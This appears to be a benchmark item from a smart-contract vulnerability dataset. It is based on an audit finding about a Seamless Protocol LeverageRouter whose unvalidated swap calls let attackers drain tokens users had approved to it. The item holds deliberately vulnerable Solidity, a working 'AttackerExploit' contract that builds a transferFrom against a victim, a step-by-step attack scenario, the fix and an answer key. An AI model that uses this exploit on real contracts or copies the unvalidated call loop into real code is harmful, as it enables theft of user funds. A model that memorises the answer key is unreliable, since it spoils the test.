[
  {
    "id": "gs_cantina_seamless_H001",
    "subset": "gold_standard",
    "language": "solidity",
    "chain": "base",
    "source_platform": "cantina",
    "source_report": "Seamless Protocol Leverage Tokens - September 2025",
    "source_finding_id": "H-001",
    "report_url": "https://cantina.xyz/portfolio/6291d7fa-62ac-4e18-9c2d-1403bfdd3c6c",
    "github_repo_url": "https://github.com/seamless-protocol/leverage-tokens",
    "contest_date": "2025-09-03",
    "severity": "high",
    "vulnerability_type": "arbitrary_external_call",
    "difficulty_tier": 3,
    "context_level": "single_file",
    "finding_title": "Unauthorized Transfer of User-Approved ERC20 Tokens via LeverageRouter",
    "finding_description": "In `_depositAndRepayMorphoFlashLoan` & `_redeemAndRepayMorphoFlashLoan` internal functions, it allows arbitrary external calls to any addresses which are passed as `Call[] calldata swapCalls` from `deposit` or `redeem` entrypoint. The vulnerability exists because the code iterates through swapCalls array and executes arbitrary external calls using Address.functionCallWithValue without proper validation of the target address or calldata. Since LeverageRouter needs ERC20 allowance for minting shares and leverage tokens allowance for redeeming, a malicious actor can drain all funds by adding a `transferFrom` call in `swapCalls` input to deposit/redeem function on ERC20 from user who has approved, with `to` address being their controlled address. Other similar attack paths include calling `morpho.flashLoan` from arbitrary call which triggers callback with unsanitized data, and calling `permit2` to take infinite token allowance where spender is attacker controlled address.",
    "attack_scenario": "1. Alice (victim) approves LeverageRouter contract to spend her collateral tokens (e.g., 123 ETH worth)\n2. Bob (attacker) crafts a malicious deposit transaction with swapCalls array\n3. Bob's swapCalls includes: {target: collateralToken, data: transferFrom(alice, bob, 123 ether), value: 0}\n4. Bob calls leverageRouter.deposit() with 0 actual deposit but malicious swapCalls\n5. LeverageRouter executes the arbitrary call via Address.functionCallWithValue\n6. The transferFrom call succeeds because Alice has approved LeverageRouter\n7. Bob receives all of Alice's approved collateral tokens\n8. Attack can be repeated for all users who have approved the router\n9. Similar attacks possible via permit2 allowance theft or malicious flashLoan callbacks\n10. Especially exploitable on chains with public mempools like Ethereum mainnet",
    "fix_description": "There are two main ways of tackling this:\n1. All external calls should be fully validated for address and calldata being trusted and whitelisted to ensure there are no risks. Anything in the path of morpho flashloan callback should check for re-entrancy.\n2. Use a separate contract (MulticallExecutor) to make untrusted external calls which doesn't hold any assets, approvals or privileged roles outside of a single transaction context.\n\nThe fix implemented was option 2: Created MulticallExecutor contract that handles arbitrary external calls in isolation, preventing access to user approvals. The LeverageRouter was modified to delegate swap execution to this separate contract that has no token approvals.",
    "primary_file": {
      "path": "src/LeverageRouter.sol",
      "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport {ILeverageRouter} from \"./interfaces/ILeverageRouter.sol\";\nimport {ILeverageManager} from \"./interfaces/ILeverageManager.sol\";\nimport {ILeverageToken} from \"./interfaces/ILeverageToken.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\nimport {SafeERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {Address} from \"@openzeppelin/contracts/utils/Address.sol\";\n\n/**\n * @title LeverageRouter\n * @notice Router contract for depositing and redeeming leverage tokens\n * @dev Handles flash loans and arbitrary swap calls for minting/redeeming\n */\ncontract LeverageRouter is ILeverageRouter {\n    using SafeERC20 for IERC20;\n    using Address for address;\n\n    ILeverageManager public immutable leverageManager;\n\n    struct FlashLoanParams {\n        ILeverageToken leverageToken;\n        uint256 collateralAmount;\n        uint256 debtAmount;\n        uint256 minShares;\n        Call[] swapCalls;\n    }\n\n    constructor(address _leverageManager) {\n        leverageManager = ILeverageManager(_leverageManager);\n    }\n\n    /**\n     * @notice Deposit collateral and mint leverage tokens\n     * @param leverageToken The leverage token to mint\n     * @param collateralAmount Amount of collateral to deposit\n     * @param minShares Minimum shares to receive\n     * @param maxDebt Maximum debt to take\n     * @param swapCalls Array of external calls for swapping\n     */\n    function deposit(\n        ILeverageToken leverageToken,\n        uint256 collateralAmount,\n        uint256 minShares,\n        uint256 maxDebt,\n        Call[] calldata swapCalls\n    ) external returns (uint256 shares) {\n        // Pull collateral from user\n        IERC20 collateralToken = leverageManager.getCollateralToken(leverageToken);\n        collateralToken.safeTransferFrom(msg.sender, address(this), collateralAmount);\n\n        // Approve leverage manager\n        collateralToken.safeApprove(address(leverageManager), collateralAmount);\n\n        // Execute flash loan for leverage\n        FlashLoanParams memory params = FlashLoanParams({\n            leverageToken: leverageToken,\n            collateralAmount: collateralAmount,\n            debtAmount: maxDebt,\n            minShares: minShares,\n            swapCalls: swapCalls\n        });\n\n        shares = _depositAndRepayMorphoFlashLoan(params);\n    }\n\n    /**\n     * @notice Internal function to handle deposit with flash loan\n     * @param params Flash loan parameters including swap calls\n     */\n    function _depositAndRepayMorphoFlashLoan(\n        FlashLoanParams memory params\n    ) internal returns (uint256 shares) {\n        // Get debt token and borrow via flash loan\n        IERC20 debtToken = leverageManager.getDebtToken(params.leverageToken);\n        \n        // Request flash loan from Morpho\n        // ... flash loan logic ...\n\n        // VULNERABILITY: Execute arbitrary external calls without validation\n        for (uint256 i = 0; i < params.swapCalls.length; i++) {\n            // No validation of target address or calldata\n            // Attacker can call transferFrom on any ERC20 token\n            // stealing funds from users who approved this router\n            Address.functionCallWithValue(\n                params.swapCalls[i].target,\n                params.swapCalls[i].data,\n                params.swapCalls[i].value\n            );\n        }\n\n        // Deposit collateral and mint shares\n        shares = leverageManager.deposit(\n            params.leverageToken,\n            params.collateralAmount,\n            params.minShares\n        );\n\n        // Repay flash loan\n        debtToken.safeApprove(address(leverageManager), params.debtAmount);\n        // ... repayment logic ...\n\n        return shares;\n    }\n\n    /**\n     * @notice Redeem leverage tokens for collateral\n     * @param leverageToken The leverage token to redeem\n     * @param shares Amount of shares to redeem\n     * @param minCollateral Minimum collateral to receive\n     * @param swapCalls Array of external calls for swapping\n     */\n    function redeem(\n        ILeverageToken leverageToken,\n        uint256 shares,\n        uint256 minCollateral,\n        Call[] calldata swapCalls\n    ) external returns (uint256 collateralAmount) {\n        // Pull leverage tokens from user\n        IERC20(address(leverageToken)).safeTransferFrom(msg.sender, address(this), shares);\n\n        // Execute flash loan for deleveraging\n        FlashLoanParams memory params = FlashLoanParams({\n            leverageToken: leverageToken,\n            collateralAmount: minCollateral,\n            debtAmount: 0,\n            minShares: shares,\n            swapCalls: swapCalls\n        });\n\n        collateralAmount = _redeemAndRepayMorphoFlashLoan(params);\n    }\n\n    /**\n     * @notice Internal function to handle redemption with flash loan\n     * @param params Flash loan parameters including swap calls\n     */\n    function _redeemAndRepayMorphoFlashLoan(\n        FlashLoanParams memory params\n    ) internal returns (uint256 collateralAmount) {\n        // ... flash loan and redemption logic ...\n\n        // VULNERABILITY: Same issue - arbitrary external calls\n        for (uint256 i = 0; i < params.swapCalls.length; i++) {\n            Address.functionCallWithValue(\n                params.swapCalls[i].target,\n                params.swapCalls[i].data,\n                params.swapCalls[i].value\n            );\n        }\n\n        // Redeem shares for collateral\n        collateralAmount = leverageManager.redeem(\n            params.leverageToken,\n            params.minShares,\n            params.collateralAmount\n        );\n\n        return collateralAmount;\n    }\n}\n\n// Attacker's exploit contract\ncontract AttackerExploit {\n    LeverageRouter public router;\n    IERC20 public targetToken;\n    address public victim;\n\n    function exploit() external {\n        // Craft malicious swap call that steals victim's approved tokens\n        ILeverageRouter.Call[] memory maliciousSwapCalls = new ILeverageRouter.Call[](1);\n        maliciousSwapCalls[0] = ILeverageRouter.Call({\n            target: address(targetToken),\n            data: abi.encodeWithSelector(\n                IERC20.transferFrom.selector,\n                victim,\n                address(this),\n                targetToken.balanceOf(victim)\n            ),\n            value: 0\n        });\n\n        // Execute deposit with 0 actual deposit but malicious swap calls\n        router.deposit(\n            ILeverageToken(address(0)), // dummy\n            0, // no actual deposit\n            0,\n            0,\n            maliciousSwapCalls\n        );\n    }\n}",
      "vulnerable_lines": [65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 121, 122, 123, 124, 125, 126, 127, 128],
      "vulnerable_functions": ["_depositAndRepayMorphoFlashLoan", "_redeemAndRepayMorphoFlashLoan", "deposit", "redeem"]
    },
    "context_files": [
      {
        "path": "src/MulticallExecutor.sol",
        "content": "// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport {Address} from \"@openzeppelin/contracts/utils/Address.sol\";\nimport {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/**\n * @title MulticallExecutor\n * @notice Isolated contract for executing arbitrary external calls\n * @dev This contract intentionally has NO token approvals or privileged roles\n *      It exists solely to execute untrusted external calls in isolation\n *      preventing attackers from accessing user token approvals\n */\ncontract MulticallExecutor {\n    using Address for address;\n\n    struct Call {\n        address target;\n        bytes data;\n        uint256 value;\n    }\n\n    /**\n     * @notice Execute multiple external calls\n     * @param calls Array of calls to execute\n     * @dev Since this contract has no approvals, arbitrary calls cannot steal funds\n     */\n    function executeMulticall(Call[] calldata calls) external payable {\n        for (uint256 i = 0; i < calls.length; i++) {\n            calls[i].target.functionCallWithValue(calls[i].data, calls[i].value);\n        }\n    }\n\n    /**\n     * @notice Sweep any ETH accidentally sent to this contract\n     */\n    function sweepETH(address recipient) external {\n        (bool success, ) = recipient.call{value: address(this).balance}(\"\");\n        require(success, \"ETH sweep failed\");\n    }\n\n    /**\n     * @notice Sweep any tokens accidentally sent to this contract\n     */\n    function sweepToken(IERC20 token, address recipient) external {\n        token.transfer(recipient, token.balanceOf(address(this)));\n    }\n\n    receive() external payable {}\n}",
        "relevance": "This is the fix contract - MulticallExecutor isolates arbitrary external calls in a separate contract that holds no token approvals or privileged roles, preventing the exploitation of user approvals"
      }
    ],
    "call_flow": "User.deposit() -> LeverageRouter.deposit() -> LeverageRouter._depositAndRepayMorphoFlashLoan() -> loops through swapCalls[] -> Address.functionCallWithValue(maliciousTarget, maliciousData) -> ERC20.transferFrom(victim, attacker, amount) using victim's prior approval to LeverageRouter",
    "context_hint": "This is a critical vulnerability in swap execution logic where untrusted user input (swapCalls array) is executed without validation. The LeverageRouter contract requires users to approve it for token spending to facilitate deposits/redemptions. An attacker exploits this by crafting malicious swapCalls that invoke transferFrom on ERC20 tokens, stealing funds from any user who has approved the router. The vulnerability is compounded by the fact that: (1) the router needs persistent approvals from users, (2) arbitrary addresses and calldata can be passed, (3) multiple attack vectors exist (direct transferFrom, permit2, malicious flashLoan callbacks), and (4) it's especially dangerous on chains with public mempools. The fix uses the isolated MulticallExecutor pattern - a separate contract with no approvals handles all arbitrary external calls.",
    "is_vulnerable": true,
    "expert_notes": "This represents a classic 'unauthorized approval exploitation' vulnerability in DeFi routers. The core issue is mixing privileged operations (holding user approvals) with untrusted operations (arbitrary external calls). Key insights: (1) The vulnerability pattern is common in DEX aggregators and routers that need approvals, (2) Defense-in-depth would include: whitelist validation, separate executor contracts, and flash-loan style approvals that expire after transaction, (3) The MulticallExecutor fix is elegant - it completely isolates the attack surface by ensuring the contract executing arbitrary calls has zero privileges, (4) Additional attack vectors mentioned (permit2, flashLoan callbacks) show this is a systemic design flaw not just a single code path issue, (5) On Ethereum mainnet with public mempool, attackers can front-run legitimate transactions to exploit approvals. Similar vulnerabilities: the $196M Beanstalk hack, multiple DEX aggregator exploits."
  }
]